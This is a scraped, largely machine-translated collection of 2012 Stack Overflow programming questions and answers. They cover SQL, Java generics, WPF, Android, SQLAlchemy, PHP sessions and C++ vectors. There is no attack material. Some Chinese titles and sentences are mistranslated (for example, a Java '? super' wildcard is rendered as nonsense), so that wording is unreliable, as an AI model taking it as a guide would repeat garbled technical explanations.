在性能方面，我希望它们都是相同的，因为它们都涉及一个`objc_msgSend()`：`image.size`是获取大小`image.CGImage`的方法调用，是获取`CGImageRef`. 这些是存储属性，因此在任何情况下获取它们的成本都不高。

# date-range - 如何按日期范围按五个 5 分钟分组？

> ID：12954322
> 
> 赞同：0
> 
> 时间：2012-10-18T12:11:43.770
> 
> 标签：date-range

> **可能重复：**
> [在mysql中按范围分组](https://stackoverflow.com/questions/6687534/group-by-range-in-mysql)

我想`count(*)`通过将它们分成 5 分钟来在特定范围之间。例如

*   开始时间**13-03-2012 10:30**

*   结束时间**13-03-2012 10:45**

这个时间范围应该分成3个范围，具体统计一下

例如：

## 范围计数（*）

范围 1 5 范围 2 7 范围 3 11

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:20:25.163

您可以创建一个返回数据集的函数。

参数可以是开始时间、结束时间和间隔数。

伪代码：

```
declare return @return table --- temp table
for 1 to intervalCount
   calculate start and endtime of interval
   select @c=count(*) from tbl where time between intervalstart and intervallend
   insert into @return (@c)
end for 
```

我希望这能给你一个想法。请告诉我们您正在使用哪个 RDBMS。

# java - 通用论证方法 ? 极好的

> ID：12954326
> 
> 赞同：1
> 
> 时间：2012-10-18T12:11:55.393
> 
> 标签：java, generics, wildcard, bounded-wildcard

如果这种类型应该能够添加 Apple 的任何超类型，为什么**不能将新对象添加到列表中？**

```
import java.util.List;
import java.util.ArrayList;
class Apple{}
public class Macintosh extends Apple {
    public static void main(String[] munch){
        List<Apple> a = new ArrayList<Apple>();
        basket(a);
    }
    static void basket(List<? super Apple> list){ list.add(new Object());}
} 
```

如果我们将参数更改为 List 列表，它当然可以工作：s

* * *

```
class Animal{}
class Dog extends Animal{}
class Cat extends Animal{}
public class Mixer<A extends Animal>{
    public <C extends Cat> Mixer<? super Dog> useMe(A a, C c){
        return new Mixer<Animal>();
    }
} 
```

如果以前编译器不知道对象的Class，为什么我们可以在返回时使用Mixer，现在是因为是一个类？¿？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:22:38.080

您正在尝试将不是 Apple 的东西添加到 Apple 列表中（对象不是 Apple 的子类）。因此，编译错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T13:08:01.793

您不能将 Apple 及其子类型以外的任何内容添加到 a`List<? super Apple>`中，因为 ? 表示“某种类型”而不是“任何类型”。它是某种类型的实例列表，要么是 Apple，要么是 Apple 的超类型，并且无法知道具体是哪一种类型？方法。

如果可以的话，我建议避免这些限制，它们经常没有帮助，而且很容易导致混乱。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-19T15:23:53.130

正如其他人所指出的，通配符类型是存在量化的类型，而不是普遍量化的。这意味着，当使用通配符类型的变量时，您可以在写入时分配您希望的任何匹配类型，但在从变量读取时不能假定任何特定类型。写作时，你控制选择，但阅读时，别人为你选择。

**更多详情**

*   **写作时您可以完全控制。**`return`方法的返回值在语句中写入其主体内部。它的参数被写入您调用该方法的位置。您可以愉快地将特定类型分配给通配符`return`语句或将特定类型传递给通配符方法参数。

*   **阅读时，选择是强加给你的。**在调用方法的地方读取方法的返回值。它的参数在它的主体中读取，您可以在其中定义方法。`basket()`当您尝试使用pass 时，您会遇到内部困难`list`。

> 如果我们将参数更改为 List 列表，它当然可以工作：s

那是一个完全不同的故事。`List`是原始类型。正如您自己发现的那样，您可以做不安全的事情，例如在使用原始类型时将 an`Orange`或任何其他内容添加`Object`到 a中。`List<Apple>`Java 支持原始类型主要是出于历史原因，例如向后兼容性。它们在设计上是不健全的。如果您以这种方式使用原始类型，您可能会在`ClassCastException`以后获得 s：

```
 List<Apple> a = new ArrayList<Apple>();
    basket(a);
    for (Apple apple : a) {     // Is not assignable to Apple, throws ClassCastException
        System.out.println(apple);
    } 
```

# c# - 在 C# 中从资源中动态添加和加载图像

> ID：12954327
> 
> 赞同：10
> 
> 时间：2012-10-18T12:11:56.983
> 
> 标签：c#, wpf, image, resources

我的解决方案中添加了一些图像，现在它位于解决方案资源管理器内的文件夹 images\flowers\rose.png 下。我想要一种将此图像动态加载到我的图像控件的方法。

我目前的方法是使类型为“内容”并使用“始终复制”属性。然后我会给出图像的相对路径，如下所示。

```
Image2.Source = new BitmapImage(new Uri("/images/flowers/Customswipe_b.png", UriKind.Relative)); 
```

有没有办法让它从资源中加载而不将其复制到目标系统。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-10-11T07:37:00.583

以下对我来说很好：

```
image.Source = new BitmapImage(new Uri("pack://application:,,,/YourAssemblyName;component/Resources/someimage.png", UriKind.Absolute)); 
```

此外，您应该将`Build Action`图像的更改`None`为`Resource`。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-18T12:45:23.653

您可以打开资源编辑器（解决方案资源管理器，单击 Resources.resx）并在那里添加图像。然后你可以简单地访问`Bitmap`它`Properties.Resources.ImageId`

[http://msdn.microsoft.com/en-us/library/3bka19x4(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/3bka19x4(v=vs.100).aspx)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2018-01-05T21:09:35.537

我在查找 URI 的确切语法时遇到了一些问题，因此请参阅下面的更多详细信息：

如果您的图像 ( `myImage.png`) 位于子文件夹“图像”（来自根目录）中，则确切的语法是：

```
image.Source = new BitmapImage(new Uri(@"pack://application:,,,/images/myImage.png", UriKind.Absolute)); 
```

如果您的图像位于子文件夹中`images/icon/`（来自根目录），则语法为：

```
image.Source = new BitmapImage(new Uri(@"pack://application:,,,/images/icon/myImage.png", UriKind.Absolute)); 
```

*   请注意，该部分`"pack://application:,,,`不会改变。
*   请务必将“构建操作”设置为“资源”

有关更多信息：[请参阅此处](https://docs.microsoft.com/en-us/dotnet/framework/wpf/app-development/pack-uris-in-wpf#Resource_File_Pack_URIs___Local_Assembly)。

# .net - 我如何知道 AppDomain 何时启动？

> ID：12954329
> 
> 赞同：4
> 
> 时间：2012-10-18T12:12:10.450
> 
> 标签：.net, appdomain

类似于 以[编程方式查找 ASP.NET 工作进程和应用程序域上次启动的时间？](https://stackoverflow.com/questions/4056635/programmatically-find-when-the-asp-net-worker-process-and-app-domain-last-starte)但更一般。

如何找出 AppDomain 的开始时间？

我已经证实了这样的事情：

```
private readonly static DateTime _appDomainStarted = DateTime.UtcNow;

        public static DateTime GetApplicationDomainStartedTimeUTC()
        {
            return _appDomainStarted;
        } 
```

但是静态只有在运行时被引用一次后才会创建，所以它不起作用。

也许有一种方法可以确保在加载程序集时自动运行此代码？

# java - Apache HttpClient is throwng HTTP 500s but can't reproduce in a browser

> ID：12954331
> 
> 赞同：6
> 
> 时间：2012-10-18T12:12:18.577
> 
> 标签：java, apache-httpclient-4.x

Using `HttpClient` 4.1.3, I've written the following code:

```
HttpClient httpClient = HttpClientFactory.newHttpClient();
HttpGet httpGet = new HttpGet("some/url/to/hit");
HttpResponse httpResp = httpClient.execute(httpGet);
int statusCode = httpResp.getStatusLine().getStatusCode();
if(statusCode != HttpStatus.SC_OK)
    throw new Exception(/* ... */); 
```

That's getting HTTP 500 responses (as found in the `httpResp.getStatusLine().getStatusCode()`) from a particular URL and throwing the exception.

The thing is, when I go to the "failing" URL in a browser, its running perfectly fine.

So I ask:

*   Could `HttpClient` be timing out, short-circuiting the request-response cycle, and just giving me an HTTP 500?
*   What else could be going on here? How is it possible for `HttpClient` to be giving me 500s when the browser is displaying the page perfectly fine for the same exact URL?

Thanks in advance!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-15T14:06:48.813

我有同样的问题。我可以通过浏览器访问网站，但是在使用 apache http 客户端时，我一直收到 http 500 内部服务器错误。问题是“内容类型”GET Header。它具有“多部分/相关”的值，一些服务器似乎不喜欢。我将其更改为“text/html”，一切正常。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-16T17:14:46.360

我在访问基于 spring xml 的 api 时遇到了同样的问题。通过将接受标头设置为 xml 和 html 解决了该问题。

```
httpGet.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;"); 
```

# object - Knockout - save state with amplify

> ID：12954332
> 
> 赞同：1
> 
> 时间：2012-10-18T12:12:20.910
> 
> 标签：object, knockout.js, save, state, observable

I'm wondering if Amplify can easily handle big data model with lots of nested knockout observable objects. The goal is to save and restore current state of the data (view) model after page refresh.

From few examples seems that every observable needs to be extended to use local store. Probably that can be applied globaly, but I'm not sure how will the nested observable objects behave. (ie. viewModel has many observable variables and each of them holds json objects with more observable variables etc.). Is it possible to save the state of the viewModel so that after page refresh all nested observables are restored in a proper way? (Another problem could be performance as it has to be used on the mobile devices)

Does anyone has any experience with these kind of issues?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T20:57:46.403

这是可以做到的，我正在这样做。尽管我已将其拆分为单独的模块来处理我的 ajax 调用和缓存。

需要注意的一点是，如果您使用 observables 存储整个淘汰视图模型，则在将其取回时，将不会恢复数据。这是因为你的 observables 是函数而不是数据本身。

为此，您必须将您的可观察视图模型转换为正确的 Javascript 对象（如果使用映射插件，则为 ko.toJS 或 ko.mapping.toJS），然后存储它。当您检索数据时，您必须通过您的视图模型将其发送以重新创建可观察对象。

这并不像你想象的那么昂贵。使用映射插件很容易做到这一点。但是，如果您的阵列中有大量数据，那么您应该重新考虑获取如此多的数据，尤其是对于移动设备。

# c++ - C 和 Matlab：为什么 Matlab 中的这一行代码在 Matlab Coder 生成的 C++ 代码中会变成这么多行？

> ID：12954334
> 
> 赞同：7
> 
> 时间：2012-10-18T12:12:26.267
> 
> 标签：c++, c, matlab, code-generation

我有一些运行数百万次的 Matlab 代码，如以下问题所述：[Matlab：从循环中重复调用相同的 mex 函数会产生太多开销吗？](https://stackoverflow.com/questions/12921705/matlab-does-calling-the-same-mex-function-repeatedly-from-a-loop-incur-too-much)

我正在尝试对其进行混合以查看是否有帮助。现在，当我使用 Matlab Coder 工具从 Matlab 代码生成代码时，代码通常是合理的，但是这一行 Matlab 代码（在下面第一行的 C++ 注释中）引发了这种怪物，我不知道为什么。任何有助于理解和降低其复杂性的帮助将不胜感激。

对于上下文，d 是二维矩阵，s1 是行向量。s1_idx 在前面的 C++ 代码中被赋值为 length(s1) + 1，

```
/* d(:, 1) = 0:length(s1); */
cdiff = s1_idx_0 - 1;
for (nm1d2 = 0; nm1d2 <= cdiff; nm1d2++) {
   tmp_data[nm1d2] = nm1d2;
}
ndbl = (int32_T)muDoubleScalarFloor((real_T)s1_sizes[1] + 0.5);
apnd = ndbl;
cdiff = ndbl - s1_sizes[1];
if (muDoubleScalarAbs((real_T)cdiff) < 4.4408920985006262E-16 * (real_T)s1_sizes[1]) {
   ndbl++;
   apnd = s1_sizes[1];
} else if (cdiff > 0) {
   apnd = ndbl - 1;
} else {
   ndbl++;
}
if (ndbl > 0) {
   b_tmp_data[0] = 0.0;
   if (ndbl > 1) {
       b_tmp_data[ndbl - 1] = (real_T)apnd;
       nm1 = ndbl - 1;
       nm1d2 = nm1;
       nm1d2 = (int32_T)((uint32_T)nm1d2 >> 1);
       for (cdiff = 1; cdiff <= nm1d2 - 1; cdiff++) {
           b_tmp_data[cdiff] = (real_T)cdiff;
           b_tmp_data[(ndbl - cdiff) - 1] = (real_T)(apnd - cdiff);
       }
       if (nm1d2 << 1 == nm1) {
           b_tmp_data[nm1d2] = (real_T)apnd / 2.0;
       } else {
           b_tmp_data[nm1d2] = (real_T)nm1d2;
           b_tmp_data[nm1d2 + 1] = (real_T)(apnd - nm1d2);
       }
   }
}
cdiff = s1_idx_0 - 1;
for (nm1d2 = 0; nm1d2 <= cdiff; nm1d2++) {
   SD->f0.d_data[tmp_data[nm1d2]] = b_tmp_data[nm1d2];
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T15:01:14.220

对于您真正想要完成的事情，这是非常有趣的生成代码。您只想将整数 0 到 k 填充到数组中。但是代码生成器是为处理一般情况而构建的。所以生成的代码分为三个部分：

1.  创建一个索引数组，指定左侧的元素在左侧的位置。你使用了这个`:`表达式，但你可以使用别的东西。代码生成器必须为你做类似的事情做好准备`d(length(s1):0, 1)=0:length(s1)`。
2.  为右侧创建一个值数组。您只是在做连续整数，但代码生成器已准备好处理双精度数，并且在从一系列双精度数创建值时，您可能会遇到有趣的舍入问题。它正在检查各种边缘情况。
3.  最后，有一个循环将右侧的值实际分配给左侧的内存槽，由步骤 1 中创建的数组索引。

最后，您可能只需要：

```
cdiff = s1_idx_0 - 1;
for (nm1d2 = 0; nm1d2 <= cdiff; nm1d2++) {
   SD->f0.d_data[nm1d2] = nm1d2;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:22:15.173

MatLab 是一种特殊情况，旨在使用特殊的数学函数。你确实意识到，在幕后东西仍然被翻译成处理器可以理解的大量机器代码。

有很多关于 SO 的问题都在问同样的问题：“为什么 XX 在 Matlab 中这么容易，而在 C++ 中这么难？”。因为 Matlab 就是为此而*设计*的，而 C++ 是一种通用语言。

Matlab 开发人员必须编写那些大代码表，以便为您提供一种仅用一行代码就可以使用此功能的方法。C++ 标准库中没有它，因此您需要自己制作。

好吧，举个简单的例子。假设用户 A 和 B 想要求解一个二次方程。用户 A 正在使用数学包，他所要做的就是写

> 查找 x 输入 2x ² + 6x + 3 = 0

另一方面，用户 B 正在使用 C++，他必须*编写*一个函数来计算判别式、计算值（当然他也必须担心负判别式）并输出它们，这是开发人员数学包已经为用户 A 完成了。这确实是很多代码，[这是我快速搜索的](http://jblanco_60.tripod.com/c_pp_quadratic.html)一个示例。

现在想象用户 A 说“嘿，B，你为什么要写这么多代码？我可以在 1 行中完成！” 这将是你的情况;）

另外不要忘记，如果您谈论可读性和人类易于理解，自动生成的代码并不总是最好的代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-03T18:05:07.560

我参加这个聚会迟到了，但现有的答案集中在它发生的原因上，而不是讨论你能做些什么。

如果您知道哪一行导致出现奇怪、混乱的 C 代码，您应该尝试更改该行。代替：

```
d(:, 1) = 0:length(s1); 
```

要尝试的一件事是消除对变量的依赖`s1`：

```
d(:, 1) = 0:size(d,1); 
```

另一种选择是编写一个几乎可以直接翻译成 C 的简单循环。希望 codegen 能提供非常相似和简单的 C 代码。

```
for i = 0:size(d,1)
    d(i,1) = i;
end 
```

# android - Disabling Android keyguard from a service

> ID：12954336
> 
> 赞同：0
> 
> 时间：2012-10-18T12:12:30.630
> 
> 标签：android, service, dismiss, keyguard

I want to implement a service that disables the keyguard when connected to a certain WiFi network, and restores the keyguard when disconnected.

On my Galaxy Nexus (CM10) and HTC Desire (MIUI), I've tried the following solutions, but none have worked well:

*   Tried using disableKeyguard() and reenableKeyguard() from inside the service. The problem is that it disables the keyguard at first, but when I open a different application and press home, I suddenly get the keyguard. After that, it doesn't work at all. Also, these functions are deprecated.
*   I built a new activity which I start from inside my service using the new_task flag. I gave it one of the following to actions: showkeyguard and hidekeyguard. Accordingly I used getWindow().addFlags() to set FLAG_DISMISS_KEYGUARD or FLAG_SHOW_WHEN_LOCKED. The problem is the activity shows up and has to stay visible.

Can anyone suggest a method of doing this from a service? If the first solution is the only way to do it from the service, then I don't mind the deprecated stuff. What I want to know is why it's acting like that?

Thanks.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-30T04:07:09.313

你有没有在服务启动时尝试过disblekeyguard，在服务销毁时启用keyguard

# android - How Can i Store more Than One Fields in List View

> ID：12954337
> 
> 赞同：0
> 
> 时间：2012-10-18T12:12:30.210
> 
> 标签：android, android-layout, android-intent, android-widget

In my view i have 3 edit text and 3 button say add,remove,save.

1.  While pressing Add Button i want to Store these 3 fields values into my List View.
2.  Pressing Remove i want to remove these three fields from List View.
3.  while pressing Save i want to Save whole Data's in List View in-to my Local database.

Please Tell me How can i create a List-View to Store 3 Values. And is that Possible to Create Heading For List View?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:24:55.753

您可以在每个项目中创建一个包含 3 个子视图的列表视图。去做这个：

1.  为要在项目中显示的 3 个对象创建一个类（一个容器）
2.  保留要在列表视图中显示的那些对象的列表/数组
3.  实现你自己的[适配器](http://developer.android.com/reference/android/widget/Adapter.html "适配器")
4.  使用存储对象的数组/列表创建适配器
5.  覆盖适配器的[`getView:`](http://developer.android.com/reference/android/widget/Adapter.html#getView%28int,%20android.view.View,%20android.view.ViewGroup%29)方法 - 为要显示的 3 个值膨胀一个视图（可能带有 3 个子视图）

当您触摸“添加”时，为 3 个值创建一个对象并将其添加到对象数组中。您必须处理适配器的项目更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:31:07.827

此代码会将您的数据与列表视图绑定。您将需要一个 xml 文件 (R.layout.itemlistviewselectform)，其中包含每个项目所需的视图。

在此代码中： lv 是您的列表视图。

listItems 你的数据，在我的例子中是一个 HashMap 的 ArrayList，有两个键：名称和描述。

第 4 个参数是将接收名称和描述的 TextView ID。

```
SimpleAdapter mSchedule = new SimpleAdapter(getApplicationContext(), listItems, R.layout.itemlistviewselectform, new String[] {"name", "description"}, new int[] {R.id.lvftitle, R.id.lvfdesc});
lv.setAdapter(mSchedule); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:21:57.810

可以通过简单地为您的列表视图创建一个*标题：*

```
list.addHeaderView(headerView) 
```

但是 ListView 是一个非常复杂的视图，因此如果您只有几个元素（例如 3 个），建议您动态添加视图（请参阅最后几分钟的[Google IO 演示）](http://www.youtube.com/watch?v=wDBM6wVEO70&t=40m45s)

希望能帮助到你：）

# python - Grouping Threaded Comments fetched from database

> ID：12954340
> 
> 赞同：1
> 
> 时间：2012-10-18T12:12:42.523
> 
> 标签：python, sql, sqlalchemy

I am following the following tutorial on displaying hierarchical data from database [http://docs.sqlalchemy.org/en/rel_0_7/orm/relationships.html#adjacency-list-relationships](http://docs.sqlalchemy.org/en/rel_0_7/orm/relationships.html#adjacency-list-relationships)

so far i have the following table

```
class Node(Base):
    __tablename__ = 'node'
    id = Column(Integer, primary_key=True)
    parent_id = Column(Integer, ForeignKey('node.id'))
    data = Column(String(50))
    parent = relationship("Node", remote_side=[id]) 
```

And the following entries in mysql

```
id  parent_id   data
1   NULL            root
2   1 [->]          child1
3   1 [->]          child2
4   3 [->]          subchild1
5   3 [->]          subchild 2
6   1 [->]          child3
7   NULL            root2
8   NULL            root3
9   7 [->]          subchild0froot2
10  8 [->]          subchildofroot3
11  1 [->]          child4 
```

I want to retrieve data in a format that will be suitable for comments e.g root -> child1 -> child2 ->(subchild1->subchild2)->child4

So far i have been able to retrieve the children of a parent through this query

```
nodealias = aliased(Node)
qry = session.query(nodealias,Node).\
                join(nodealias, Node.parent).\
                filter(and_(Node.postid==45))

print qry
for x,y in qry:
    print x.data
    print y.data

    print "...."

And it displays

root
child1
....
root
child2
....
child2
subchild1
....
child2
subchild 2
....
root
child3
....
root
child4
.... 
```

I want to group this results in the following manner

```
root
....
child1
....
child2
subchild1
subchild 2
....
child3
....
child4
.... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T17:09:40.297

为了在没有他的孩子的情况下获得根，您应该使用 OUTER JOIN 而不是 INNER JOIN。

要按父母对孩子进行分组，您应该使用 GROUP BY。

因此，您的查询将是：

```
 qry = session.query(nodealias,Node).\
        outerjoin(nodealias, Node.parent).\
        group_by(Node.parent).all() 
```

然后，要在您的第一级叶子之间设置分隔符，您必须在遍历结果时对 parent.id 进行测试。不要忘记检查 NoneType 父级，因为您在结果集中包含根。

```
 for parent, child in qry:
    if parent is None or parent.id != 1:
      print child.data
    else:
      print '...'
      print child.data 
```

为了更好地表示 3 级叶子，您可以通过检查 parent.id != 2 来应用类似的技术。

希望这会帮助你。

# sql - 将表中的所有列设置为“null”

> ID：12954342
> 
> 赞同：4
> 
> 时间：2012-10-18T12:12:45.520
> 
> 标签：sql, sql-server-2008

有没有一种快速的方法可以将表中所有为空的字段更改为空字段。我有很多列，所以想知道是否有办法按表格而不是按列来完成。

我需要类似的东西

```
update table 1 
set * = '' 
where * is null 
```

但显然这是不正确的语法

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:33:45.940

此代码将生成更新语句列表，您只需运行它：

```
SELECT  'update '+ so.name+' set '+sc.name+'= '''' where '+sc.name+' is null '   
FROM sysobjects so
JOIN syscolumns sc ON so.id = sc.id
JOIN systypes st ON sc.xtype=st.xtype  
where so.type = 'U'
and st.name in('varchar','char')
--and so.name = 'tab' <--- if you need update only one table 
```

[在这里（sql fiddle）](http://sqlfiddle.com/#!3/f6a09/2/0)你可以看到它是如何工作的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:24:37.347

如果要生成一个脚本，将所有包含 NULL 的 NULLable 字段更新为空白，可以使用以下代码：

```
DECLARE @TAB VARCHAR(1000) = 'ProductVendor', 
        @COL VARCHAR(1000), 
        @SQL VARCHAR(MAX) 
DECLARE UPDATE_CURSOR CURSOR LOCAL FAST_FORWARD FOR 
  SELECT t2.NAME 
    FROM (SELECT * 
            FROM SYSOBJECTS 
           WHERE XTYPE = 'u' 
                 AND NAME = @TAB)T1 
         INNER JOIN SYSCOLUMNS t2 
                 ON T1.ID = t2.ID 
   WHERE t2.ISNULLABLE = 1 

OPEN UPDATE_CURSOR 

SET @SQL = 'UPDATE ' + @TAB + ' SET ' 

FETCH NEXT FROM UPDATE_CURSOR INTO @COL 

WHILE @@FETCH_STATUS = 0 
  BEGIN 
      SET @SQL = @SQL + @COL + ' = Isnull(' + @COL + ', ''''),' 

      FETCH NEXT FROM UPDATE_CURSOR INTO @COL 
  END 

CLOSE UPDATE_CURSOR 

DEALLOCATE UPDATE_CURSOR 

SET @SQL = LEFT(@SQL, Len(@SQL) - 1) 

EXEC (@SQL) 
```

您需要做的就是在开头更改表名（TAB 变量）。该脚本生成一个查询，将在一次运行中更新所有列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:35:50.697

尝试这样的事情：

```
UPDATE TABLE1 
   SET ( COL1, COL2, COL3, COL4 ) = (SELECT COL1A, 
                                            COL2A, 
                                            COL3A, 
                                            COL4A 
                                       FROM TABLE2 
                                      WHERE COL5A = TABLE1.COL5) 
 WHERE COL5 IN (SELECT COL5A 
                  FROM TABLE2) 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-10-18T12:24:54.393

请试试这个

```
 update table1 set columnnames='' where columnnames ='null' 
```

# java - Android：打开默认电话拨号

> ID：12954346
> 
> 赞同：-4
> 
> 时间：2012-10-18T12:12:57.763
> 
> 标签：java, android

```
<TextView
    android:id="@+id/TextView03"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_above="@+id/header"
    android:layout_alignLeft="@+id/button1"
    android:layout_marginBottom="127dp"
    android:text="@string/phone"
    android:textColor="#000000"
    android:textSize="12dp"
    android:typeface="sans" /> 
```

我有一个测试视图，其中包含我的电话信息。如何在单击消息时打开默认电话拨号框。

```
<string name="email">Phone: 1-866-232-3805</string> 
```

这是我的覆盖方法。

```
 @Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    TextView t2 = (TextView) findViewById(R.id.TextView03);
            email.setOnClickListener(new View.OnClickListener() {

                 public void onClick(View v) {
                     // TODO Auto-generated method stub                
                 }

           });
} 
```

我应该从这里做什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:21:30.687

在 textview 的 onclicklistener 中使用此代码

```
 Intent callIntent = new Intent(Intent.ACTION_DIAL);

            callIntent.setData(Uri.parse("tel:"+t2.getText()));
            startActivity(callIntent); 
```

并在您的清单文件中添加以下权限

```
 <
uses-permission android:name="android.permission.CALL_PRIVILEGED" />
  <uses-permission android:name="android.permission.CALL_PHONE" />
  <uses-permission android:name="android.permission.READ_PHONE_STATE" /> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:22:33.290

您应该首先从 string.xml 中获取号码，然后`Intent.ACTION_DIAL`使用该号码拨打电话。

```
String phone = getResources().getString(R.string.email).split(":")[1];
        Intent DialIntent = new Intent(Intent.ACTION_DIAL,Uri.parse("tel:"+phone));
        DialIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(DialIntent); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-18T12:24:04.473

如果你只想打开一个拨号器

```
Button contactsButton = (Button) findViewById(R.id.contacts_button);
        contactsButton.setOnClickListener(new Button.OnClickListener() {
            public void onClick(View v) {
                Intent myIntent = new Intent(Intent.ACTION_DIAL);
                startActivity(myIntent);
            }
        }); 
```

如果你想用指定的号码打开拨号器然后

```
Button contactsButton = (Button) findViewById(R.id.contacts_button);
        contactsButton.setOnClickListener(new Button.OnClickListener() {
            public void onClick(View v) {

                Intent callIntent = new Intent(Intent.ACTION_CALL);
                callIntent.setData(Uri.parse("tel:" +Call_number));
                startActivity(callIntent);

            }
        }); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:22:15.490

使用以下显示 CALL DIAL 的意图：

```
 Intent dial = new Intent();
 dial.setAction("android.intent.action.DIAL");
 dial.setData(Uri.parse("tel:"+ Phone));
 startActivity(dial); 
```

`Phone`您要拨打的电话号码在哪里。

# php - PHP session var disappears when iframe reloads

> ID：12954350
> 
> 赞同：0
> 
> 时间：2012-10-18T12:13:04.460
> 
> 标签：php, session-variables

I'm very new to PHP... and have a REST api which sets a session var when a user signs in:

```
$a = session_id();
if(empty($a)) session_start();
$_SESSION['id']=... 
```

When I call a testFunction in the same browser (anoter tab) the session var is still the same:

```
$sessionID = session_id();
if(empty($sessionID)) session_start();
echo($_SESSION['id']); 
```

When I Later open an iframe on the page it's still fine.

BUT, when the page inside the iframe reloads to another url, the session is lost...

```
$_SESSION['id'] // gives error: Undefined index: id 
```

That is, I'm always staying on the same page but my iframe is changing urls.

Am I missunderstanding php session vars? Am I missusing it? Both?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:15:38.470

你也需要调用`session_start()`iframe 代码，你真的在​​调用它吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:18:18.967

You *need* to call [`session_start()`](http://php.net/manual/en/function.session-start.php) whenever you are using session. You don't need to check `session_id()`.

> `session_start()` creates a session **or resumes the current one** based on a session identifier passed via a GET or POST request, or passed via a cookie.

# java - 使用 jdk 5 运行小代码片段，使用 jdk 6 运行其余代码

> ID：12954352
> 
> 赞同：0
> 
> 时间：2012-10-18T12:13:05.697
> 
> 标签：java, jdk1.6, jdk1.5

是否可以使用 jdk 5 运行小代码片段并使用 jdk 6 运行其余代码？

有一个代码可以在 jdk 5 上正常工作。我将根据 jdk 6 对其进行更改，但目前没有时间这样做。那么有什么方法可以用 jdk 5 执行 4 行。

看起来很有趣，但它是必需的....请建议我....

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:14:59.147

使用 JDK5 开发的任何东西都将与 JDK 6 兼容（从源代码的角度来看），并将在 JRE 6 JVM 上运行。注意源代码/编译和结果字节码的实际运行之间的区别。所以我认为除了使用 JDK/JRE 6 编译/运行之外，你不需要做任何事情。

# javascript - 如何从 .js 代码中确定 JavaScript 引擎？

> ID：12954353
> 
> 赞同：3
> 
> 时间：2012-10-18T12:13:05.130
> 
> 标签：javascript, v8, spidermonkey, javascript-engine, chakra

有没有一种方法可以使用 JavaScript 代码来了解 JavaScript 引擎是运行该代码的引擎？

我不想只获取 JavaScript 引擎的浏览器类型。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-29T13:46:10.493

请参阅[如何检测 Android 运行时使用的 javascript 引擎（v8 或 JSC）？](https://stackoverflow.com/questions/6768474/how-can-i-detect-which-javascript-engine-v8-or-jsc-is-used-at-runtime-in-andro/6768595#6768595)对于一些使用特征检测来确定平台的 JavaScript 代码。

还：

> 我认为更好的问题是：你为什么在乎？您基本上陷入了很多人在 90 年代末/00 年代初陷入的“浏览器检测”陷阱。不过，从那以后，我们了解到特征检测是更有用的方法，尤其是因为给定浏览器支持的特征（大部分）是移动目标。现在有代码在 IE9 上运行，并具有显着改进的 DOM 和 JavaScript 支持，但没有使用这些功能，因为它正在执行浏览器检测并依赖 IE6 技术。

来自：[https ://stackoverflow.com/a/6768595/1183010](https://stackoverflow.com/a/6768595/1183010)

# c++ - 有没有什么有效的方法来获得一个大向量？

> ID：12954367
> 
> 赞同：3
> 
> 时间：2012-10-18T12:13:46.380
> 
> 标签：c++, c++11

我需要一个内部有 n 个元素的向量（我的意思是向量的大小而不是向量的容量是 n），但不想在创建过程中初始化它们中的任何一个，因为这对我来说只是垃圾。有没有有效的方法来实现这一目标？

编辑：我所能想象的就是使用 reserve(n) 并做一些 hack（有人可以告诉我如何）让向量相信它有 n 个元素。或者我只是跳进污水坑，与 malloc 和 free 共舞。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:38:47.093

当您使用带有`size`参数的构造函数构造向量时（并且不指定要复制到向量中的元素），这些元素将被*value-initialized*。值初始化规则 (8.5p7) 指定原语是零初始化的。

解决这个问题的唯一方法是将您的原语包装在定义无操作默认构造函数的类类型中：

```
template<typename T>
struct A {
    A() {};
    T value;
};

std::vector<A<int>> vec(1000); 
```

如果可以将初始化过程封装为迭代器，则可以使用迭代器来构造向量：

```
std::vector<int> vec(it_begin, it_end); 
```

否则我建议不要太担心初始化的开销；它不会改变算法的复杂性（因为无论如何您都将访问每个成员，这已经使其成为 O(n) ）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:55:12.597

